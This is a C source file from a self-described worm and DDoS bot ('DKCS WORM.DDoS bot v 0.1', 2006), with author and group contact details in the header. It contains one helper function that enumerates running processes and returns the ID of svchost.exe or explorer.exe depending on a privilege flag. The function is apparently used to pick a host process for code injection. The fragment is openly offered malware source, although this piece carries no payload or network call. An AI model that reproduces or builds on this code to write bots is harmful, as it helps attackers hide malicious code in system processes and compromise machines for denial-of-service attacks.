//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
DWORD ProcIdByPriv(int priv){

    DWORD			procID;
    PROCESSENTRY32	proc;
    HANDLE			snapshot;
	const char*		proc_name;

    proc.dwSize = sizeof(proc);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if(priv){
		proc_name = "svchost.exe";
	}else{
		proc_name = "explorer.exe";
	}
    Process32First(snapshot, &proc);
    do{
		if(strcmp(proc.szExeFile, proc_name)==0){
			procID = proc.th32ProcessID;
			return procID;
		}
    }while(Process32Next(snapshot, &proc));
    CloseHandle(snapshot);
return 0;
}
//-----------------------------------------------------------------